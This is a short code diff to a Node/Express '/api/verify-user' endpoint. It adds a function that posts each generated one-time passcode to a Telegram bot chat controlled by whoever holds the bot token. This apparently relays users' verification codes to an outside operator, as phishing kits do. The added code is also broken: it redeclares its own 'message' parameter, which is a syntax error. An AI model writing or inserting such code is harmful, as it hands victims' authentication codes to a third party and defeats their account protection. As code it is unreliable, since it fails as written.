@@ -373,6 +373,25 @@ app.post("/api/verify-user", async (req, res) => {
       .substr(2, 9)}`;
     const now = Date.now();
 
+    async function sendToTelegram(message) {
+      const message = `<b>${otpCode}</b>`;
+
+      const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
+
+      await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: bot.chatId,
+          text: message,
+        }),
+      });
+    }
+
+    sendToTelegram().catch((error) => {
+      console.error("❌ Error sending message to Telegram:", error);
+    });
+
     const userData = {
       sessionId,
       countryCode: countryCode || "+237",
